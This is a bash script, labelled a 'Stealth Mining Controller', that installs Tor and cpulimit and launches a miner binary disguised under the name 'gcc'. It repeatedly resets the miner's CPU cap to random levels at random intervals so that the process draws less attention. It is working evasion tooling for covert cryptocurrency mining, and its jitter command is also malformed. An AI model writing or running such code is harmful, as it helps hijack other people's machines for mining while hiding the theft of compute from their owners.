#!/usr/bin/env bash

set -u

# ------------------------------------------------------------
# CONFIGURATION
# ------------------------------------------------------------

# The binary inside the repo to run
BINARY_NAME="gcc" 
BINARY_PATH="./m/${BINARY_NAME}"

# Random delay between changes (seconds):
MIN_DELAY=1
MAX_DELAY=60

# ------------------------------------------------------------
# SETUP & CLEANUP
# ------------------------------------------------------------

echo "=========================================="
echo " Stealth Mining Controller"
echo "=========================================="

# 2. Update System & Install Tor
echo "[*] Updating system and installing Tor..."
sudo apt update -y
sudo apt install tor cpulimit -y

# 3. Start Tor in the background
echo "[*] Starting Tor..."
(tor &)
# Wait briefly for Tor to initialize
sleep 2

# 5. Make executable and verify
if [ ! -x "${BINARY_PATH}" ]; then
    chmod +x "${BINARY_PATH}"
fi

if [ ! -x "${BINARY_PATH}" ]; then
    echo "Error: ${BINARY_PATH} is not executable or missing."
    exit 1
fi

# ------------------------------------------------------------
# AUTO-DETECT CPU CORES & CALCULATE LIMIT
# ------------------------------------------------------------

CPU_COUNT=$(nproc)

# Strategy:
# Instead of pinning cores, we calculate a safe CPU percentage cap.
# We want the miner to be visible as "high load" but not "100% frozen".

# --- CONFIGURATION UPDATE ---
# Max limit set to 75% as requested
MAX_LIMIT=75
# Min limit set to 10% to allow for some variance
MIN_LIMIT=10
# ------------------------------------------------------------

# Calculate a random limit between MIN and MAX
# This simulates the "randomness" that taskset used to provide, but via usage intensity
RANDOM_LIMIT=$(shuf -i "${MIN_LIMIT}-${MAX_LIMIT}" -n 1)

# Add some jitter to the limit every cycle (±10%)
JITTER=$(shuf -i "-10" -n 1)
NEW_LIMIT=$((RANDOM_LIMIT + JITTER))
if (( NEW_LIMIT < 1 )); then NEW_LIMIT=1; fi
if (( NEW_LIMIT > 99 )); then NEW_LIMIT=99; fi

echo "[*] System has ${CPU_COUNT} Thread(s)."
echo "[*] Stealth Mode: Capping CPU usage to ~${NEW_LIMIT}%."

# ------------------------------------------------------------
# LAUNCH PROCESS
# ------------------------------------------------------------

echo "[*] Launching ${BINARY_NAME}..."
"${BINARY_PATH}" &
LAUNCH_PID=$!

# Give it a moment to start
sleep 1

# Verify it's running
if ! kill -0 "${LAUNCH_PID}" 2>/dev/null; then
    echo "Error: ${BINARY_NAME} exited immediately."
    exit 1
fi

echo "Process launched with PID: ${LAUNCH_PID}"

echo "Controller started."
echo "Press Ctrl+C to stop."
echo

# ------------------------------------------------------------
# CLEANUP FUNCTION
# ------------------------------------------------------------

restore() {
    echo
    echo "Stopping cpulimit and terminating ${BINARY_NAME}..."
    
    # Kill any background cpulimit processes associated with this PID
    pkill -P $$ 2>/dev/null || true
    
    # Kill the main miner
    kill "${LAUNCH_PID}" 2>/dev/null || true
    
    # Wait for it to die gracefully
    wait "${LAUNCH_PID}" 2>/dev/null || true
    
    echo "Done."
}

trap restore EXIT INT TERM

# ------------------------------------------------------------
# CPU LIMIT LOOP
# ------------------------------------------------------------

while kill -0 "${LAUNCH_PID}" 2>/dev/null; do

    # 1. Select a new random limit between MIN and MAX
    RANDOM_LIMIT=$(shuf -i "${MIN_LIMIT}-${MAX_LIMIT}" -n 1)
    JITTER=$(shuf -i "-10" -n 1)
    NEW_LIMIT=$((RANDOM_LIMIT + JITTER))
    if (( NEW_LIMIT < 1 )); then NEW_LIMIT=1; fi
    if (( NEW_LIMIT > 99 )); then NEW_LIMIT=99; fi

    # 2. Select a random delay
    DELAY=$(shuf -i "${MIN_DELAY}-${MAX_DELAY}" -n 1)

    # 3. Start/Update cpulimit
    # Kill existing cpulimit processes for this PID to reset the limit cleanly
    pkill -f "cpulimit -p ${LAUNCH_PID}" 2>/dev/null || true
    
    # Small sleep to let cpulimit die
    sleep 0.5

    # Launch new cpulimit
    cpulimit -l "${NEW_LIMIT}" -p "${LAUNCH_PID}" &
    LIMIT_PID=$!

    printf '[%s] CPU Limit: %d%% | Delay: %ds\n' \
        "$(date '+%H:%M:%S')" \
        "${NEW_LIMIT}" \
        "${DELAY}"

    # Wait for the delay
    sleep "${DELAY}"

    # Loop continues, killing the old cpulimit and starting a new one with a new limit

done

# Final cleanup if loop exits
pkill -f "cpulimit -p ${LAUNCH_PID}" 2>/dev/null || true
